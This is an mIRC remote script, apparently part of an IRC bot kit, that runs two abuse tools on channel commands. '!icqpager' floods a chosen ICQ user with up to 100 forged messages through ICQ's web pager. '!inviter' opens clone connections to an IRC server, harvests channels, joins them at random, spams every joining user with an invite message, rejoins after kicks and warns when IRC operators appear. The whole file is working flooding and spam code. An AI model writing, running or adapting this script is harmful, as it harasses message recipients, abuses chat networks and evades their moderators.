[Script]
n1=on 10:TEXT:!icqpager*:#:{  if ($2 == help) { msg # Syntax: !icqpager uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msg # Icq Pager (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msg # Error!: !icqpager uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msg # ERROR! Under Ammount 100 please. (moreinfo type !icqpager help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 
n2=msg # 14[15ICQPAGER:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... |   /icqpager  } }
n3=alias icqpager { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
n4=on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
n5=on *:sockread:icqpager*:{ sockread -f %temp }
n6=on *:sockclose:icqpager*:{ unset %temp }
n7=on 10:TEXT:!inviter*:*:{   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg # 12[15in14vit15er12]:  Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg # 12[15in14vit15er12]: Status: Not Connected! | halt }  
n8=  if ($sock(inviter*,0) > 0) { msg # 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] }     } |   if ($2 == stats) { msg # 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsg $3- | msg # 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] } 
n9=  if ($2 == ctotal) { msg # 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { msg # 12[15in14vit15er12]: All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
n10=  if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg # 12[15in14vit15er12]: Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
n11=if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read temp.scr | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msg # 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). } }
n12=alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c 12[15in14vit15er12]: Error: Please set delay !inviter delay [ [ [ delay ] ] ] | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c 12[15in14vit15er12]:  Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c 12[15in14vit15er12]:  Error: Inviter already loaded! | halt }  
n13=//sockopen inviterN %i.server %i.port  | /msg %s.i.c 12[15in14vit15er12]:  Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )  |  //sockopen inviterM %i.server %i.port  }
n14=on *:sockread:inviter*:{   sockread -f %t.i  |  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c 12[15in14vit15er12]: Listing channels on $remove($gettok(%t.i,1,32),:) }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c 12[15in14vit15er12]: Listing channels complete on $remove($gettok(%t.i,1,32),:)  [Total Channels in List: $+ $lines(ichan.txt) $+ ] }  
n15=  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c 12[15in14vit15er12]:  Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) }    |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } |  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
n16=  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
n17=  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c 12[15in14vit15er12]: Error Connecting: %t.i (attempting to reconnect)-(to stop !inviter stop) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } 
n18=  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) {    if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |     dec %i.t.j 1  |   /msg #globalthreat   inviter! error: not inviting: $gettok(%t.i,5,32)  because he was opd!   }   |   if ($gettok(%t.i,4,32) == +v) {   if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |    dec %i.t.j 1 |   } }
n19=  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off   |  dec %i.t.j  } |  if ($gettok(%t.i,2,32) == 313) {   /msg %s.i.c 12Inviter Warning!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
n20=if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  }
n21=on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read temp.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  temp.scr ] ] |  sockwrite -tn $sockname Nick $read temp.scr  | /timerinviteconnect off | sockread  }
n22=on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c 12[15in14vit15er12]:  Inviter was disconnected! (Reloading).  | /sockopen $sockname %i.server %i.port } }
